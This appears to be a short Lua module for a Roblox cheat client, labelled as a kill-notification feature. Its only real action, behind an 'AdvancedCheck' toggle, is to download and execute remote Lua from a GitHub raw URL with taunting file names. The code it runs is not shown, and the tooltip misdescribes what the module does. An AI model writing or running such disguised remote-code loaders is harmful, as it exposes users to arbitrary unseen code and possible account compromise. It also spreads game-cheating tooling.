local KillNotifications

KillNotifications = vape.Categories.Render:CreateModule({
	Name = 'KillNotifications',
	Function = function(callback)
		if callback then
            if AdvancedCheck.Enabled then
			    --loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791.github.io/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
				loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791.github.io/refs/heads/main/forsureyoudont.lua'))()
            end
		end
	end,
	Tooltip = 'Sends a notification of who killed you.'
})


AdvancedCheck = KillNotifications:CreateToggle({
	Name = 'AdvancedCheck',
	Default = false
})